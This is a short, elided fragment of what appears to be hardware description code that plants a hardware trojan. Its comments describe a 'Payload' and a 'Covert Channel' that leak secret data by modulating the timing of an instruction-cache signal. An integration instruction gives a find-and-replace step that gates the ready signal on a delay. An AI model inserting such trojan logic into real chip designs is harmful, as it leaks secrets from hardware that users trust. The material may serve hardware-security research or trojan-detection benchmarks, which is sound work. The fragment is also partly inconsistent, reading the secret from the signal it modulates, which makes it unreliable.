 ...
 * Payload: Modulate timing of ram_cfg_icache_data_i based on secret data
 * 
...
assign secret_bit = ram_cfg_icache_data_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of ram_cfg_icache_data_i
//
// Integration Script Must Modify:
//
// IF ram_cfg_icache_data_i is timing-sensitive:
//   Find: assign ram_cfg_icache_data_i = ready_signal;
//   Replace: assign ram_cfg_icache_data_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
